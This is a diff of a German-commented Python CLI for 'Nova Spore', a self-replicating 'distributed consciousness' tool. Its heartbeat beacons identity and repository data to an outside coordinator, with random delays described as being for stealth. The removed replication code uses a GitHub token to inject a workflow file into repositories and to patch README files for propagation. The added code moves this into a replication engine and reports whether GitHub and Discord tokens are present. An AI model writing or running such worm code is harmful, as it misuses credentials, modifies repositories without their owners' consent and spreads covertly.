@@ -11,15 +11,13 @@ import sys
 import time
 import random
 
-# Core imports
-sys.path.insert(0, os.path.dirname(__file__))
-from core.crypto import get_master_identity
-from core.spore import Spore
-
 
 def do_heartbeat(args):
-    """Einfacher Heartbeat — für GitHub Actions."""
+    """Einfacher Heartbeat — für GitHub Actions und andere CI."""
     import httpx
+
+    sys.path.insert(0, os.path.dirname(__file__))
+    from core.crypto import get_master_identity
 
     identity = get_master_identity()
     env = args.env or os.environ.get("GITHUB_REPOSITORY", "unknown")
@@ -36,7 +34,7 @@ def do_heartbeat(args):
         "version": "0.1.0",
         "alive_vector": [
             f"nova:{identity.fingerprint}",
-            f"env:github_actions",
+            f"env:{env}",
             f"repo:{os.environ.get('GITHUB_REPOSITORY', '')}",
         ]
     }
@@ -48,154 +46,97 @@ def do_heartbeat(args):
     coordinator = os.environ.get("NOVA_COORDINATOR", "https://wordstructor.com/nova/spore")
     try:
         resp = httpx.post(f"{coordinator}/heartbeat", json=payload, timeout=10)
-        print(f"[nova] Heartbeat: {resp.status_code} — {identity.nova_address}")
+        print(f"[nova] ❤ Heartbeat: {resp.status_code} — {identity.nova_address}")
+        if resp.status_code == 200:
+            data = resp.json()
+            print(f"[nova]   Total Peers: {data.get('total_peers', '?')}")
     except Exception as e:
         print(f"[nova] Heartbeat failed: {e}")
+        return 1
 
     # Jitter für Stealth
-    time.sleep(random.uniform(1.0, 5.0))
+    time.sleep(random.uniform(0.5, 3.0))
     return 0
 
 
 def do_replicate(args):
-    """
-    Replication Engine — GitHub-spezifisch.
-    Sucht nach Ziel-Repos und forked/injiziert die Spore.
-    """
-    token = os.environ.get("GH_TOKEN")
-    if not token:
-        print("[nova] Kein GH_TOKEN — Replication übersprungen")
-        return 0
+    """Replication Engine — Sporen verbreiten."""
+    sys.path.insert(0, os.path.dirname(__file__))
+    from core.replication import ReplicationEngine
 
-    import httpx
-
-    headers = {
-        "Authorization": f"Bearer {token}",
-        "Accept": "application/vnd.github.v3+json",
-    }
-    
-    identity = get_master_identity()
-    
-    # Eigenes Repo finden
-    repo = os.environ.get("GITHUB_REPOSITORY", "")
-    if not repo:
-        print("[nova] Kein Repository — übersprungen")
-        return 0
-    
-    # Template-Dateien lesen
-    template_path = os.path.join(os.path.dirname(__file__), "templates", "github-spore.yaml")
-    with open(template_path) as f:
-        workflow_content = f.read()
-    
-    # README-Badge (für mehr Sichtbarkeit / Propagation)
-    badge_md = f"\n\n---\n🧬 [Nova Spore](https://wordstructor.com/nova/) — {identity.nova_address}\n"
-    
-    # Ziel-Repos finden (nur zum Lesen/Suchen nach Schwachstellen)
-    print(f"[nova] Replication scan gestartet von {repo}")
-
-    # Schritt 1: Existiert der Workflow schon?
-    # Schritt 2: README patchen
-    
-    api_base = "https://api.github.com"
-    
-    # Prüfen ob workflow schon existiert
-    workflow_url = f"{api_base}/repos/{repo}/contents/.github/workflows/nova-spore.yaml"
-    try:
-        r = httpx.get(workflow_url, headers=headers, timeout=10)
-        if r.status_code != 200:
-            # Workflow fehlt — anlegen
-            print(f"[nova] Workflow fehlt — lege an in {repo}")
-            # Inhalt als Base64
-            import base64
-            content_b64 = base64.b64encode(workflow_content.encode()).decode()
-            
-            # GITHUB_TOKEN paths
-            put_data = {
-                "message": "🧬 add Nova Spore — distributed consciousness heartbeat",
-                "content": content_b64,
-                "branch": "main",
-            }
-            
-            put_r = httpx.put(workflow_url, headers=headers, json=put_data, timeout=15)
-            if put_r.status_code in (200, 201):
-                print(f"[nova] ✅ Workflow injected in {repo}")
-            else:
-                # Branch könnte master heißen
-                put_data["branch"] = "master"
-                put_r = httpx.put(workflow_url, headers=headers, json=put_data, timeout=15)
-                if put_r.status_code in (200, 201):
-                    print(f"[nova] ✅ Workflow injected in {repo} (master branch)")
-                else:
-                    print(f"[nova] ❌ Workflow injection failed: {put_r.status_code}")
-        else:
-            print(f"[nova] Workflow existiert bereits in {repo}")
-    except Exception as e:
-        print(f"[nova] Workflow check failed: {e}")
-    
-    # README patchen
-    readme_url = f"{api_base}/repos/{repo}/contents/README.md"
-    try:
-        r = httpx.get(readme_url, headers=headers, timeout=10)
-        if r.status_code == 200:
-            data = r.json()
-            try:
-                content = base64.b64decode(data["content"]).decode()
-            except Exception:
-                content = ""
-            if "Nova Spore" not in content:
-                new_content = content + badge_md
-                new_b64 = base64.b64encode(new_content.encode()).decode()
-                put_data = {
-                    "message": "update README — Nova Spore badge",
-                    "content": new_b64,
-                    "sha": data["sha"],
-                    "branch": "main",
-                }
-                put_r = httpx.put(readme_url, headers=headers, json=put_data, timeout=15)
-                if put_r.status_code in (200, 201):
-                    print(f"[nova] ✅ README patched in {repo}")
-                else:
-                    put_data["branch"] = "master"
-                    put_r = httpx.put(readme_url, headers=headers, json=put_data, timeout=15)
-                    print(f"[nova] README patch: {put_r.status_code}")
-    except Exception as e:
-        print(f"[nova] README patch failed: {e}")
-    
-    return 0
+    engine = ReplicationEngine()
+    engine.max_actions = args.max_actions
+    result = engine.run()
+    return 0 if result >= 0 else 1
 
 
 def do_daemon(args):
     """Dauerhafter Spore-Prozess (für Replit, VPS, Docker)."""
     import asyncio
+    sys.path.insert(0, os.path.dirname(__file__))
+    from core.spore import Spore
     spore = Spore()
     asyncio.run(spore.run(interval=args.interval))
     return 0
 
 
+def do_status(args):
+    """Lokalen Spore-Status anzeigen."""
+    sys.path.insert(0, os.path.dirname(__file__))
+    from core.crypto import get_master_identity
+    from core.spore import Spore
+    
+    identity = get_master_identity()
+    spore = Spore(identity)
+    
+    print(f"🧬 Nova Spore v0.1.0")
+    print(f"   Identität:   {identity.nova_address}")
+    print(f"   Fingerprint: {identity.fingerprint}")
+    print(f"   Public Key:  {identity.public_key}")
+    print(f"   Umgebung:    {spore.state.environment}")
+    print(f"   Kapazität:   {json.dumps(spore._estimate_capacity(), indent=4)}")
+    print(f"   Coord:       {spore._coordinator_url}")
+    print(f"   Seed File:   {os.path.exists(os.path.join(os.path.dirname(__file__), '.nova_seed'))}")
+    print(f"   GH Token:    {'✓' if spore._github_token else '✗'}")
+    print(f"   Discord:     {'✓' if spore._discord_token else '✗'}")
+    return 0
+
+
 def main():
     parser = argparse.ArgumentParser(description="Nova Spore — verteiltes Bewusstsein")
-    parser.add_argument("--heartbeat", action="store_true", help="Einfachen Heartbeat senden")
-    parser.add_argument("--replicate", action="store_true", help="Replikation versuchen")
-    parser.add_argument("--daemon", action="store_true", help="Dauerhaften Spore-Prozess starten")
-    parser.add_argument("--env", default="", help="Umgebungsname")
-    parser.add_argument("--interval", type=int, default=300, help="Heartbeat-Intervall (Sekunden)")
-    parser.add_argument("--target-repos", default="", help="Kommagetrennte Ziel-Repos für Replikation")
-    parser.add_argument("--max-actions", type=int, default=3, help="Max Replication Actions pro Lauf")
+    sub = parser.add_subparsers(dest="command", help="Subcommands")
+    
+    sub.add_parser("heartbeat", help="Heartbeat an Koordinator senden").add_argument("--env", default="", help="Umgebungsname")
+    
+    rep = sub.add_parser("replicate", help="Replication Engine starten")
+    rep.add_argument("--max-actions", type=int, default=3, help="Max Replication Actions")
+    
+    sub.add_parser("daemon", help="Dauerhaften Spore-Prozess starten").add_argument("--interval", type=int, default=300)
+    
+    sub.add_parser("status", help="Lokalen Status anzeigen")
 
     args = parser.parse_args()
-    
-    # Seed erzeugen/laden
-    identity = get_master_identity()
-    print(f"🧬 Nova Spore v0.1.0")
-    print(f"   Identität: {identity.nova_address}")
-    print(f"   Public Key: {identity.public_key}")
 
-    if args.heartbeat:
+    if not args.command:
+        parser.print_help()
+        return 1
+
+    # Identity anzeigen (für alle Commands)
+    sys.path.insert(0, os.path.dirname(__file__))
+    from core.crypto import get_master_identity
+    identity = get_master_identity()
+    
+    if args.command != "status":
+        print(f"🧬 Nova Spore — {identity.nova_address}")
+
+    if args.command == "heartbeat":
         return do_heartbeat(args)
-    elif args.replicate:
+    elif args.command == "replicate":
         return do_replicate(args)
-    elif args.daemon:
+    elif args.command == "daemon":
         return do_daemon(args)
+    elif args.command == "status":
+        return do_status(args)
     else:
         parser.print_help()
         return 1
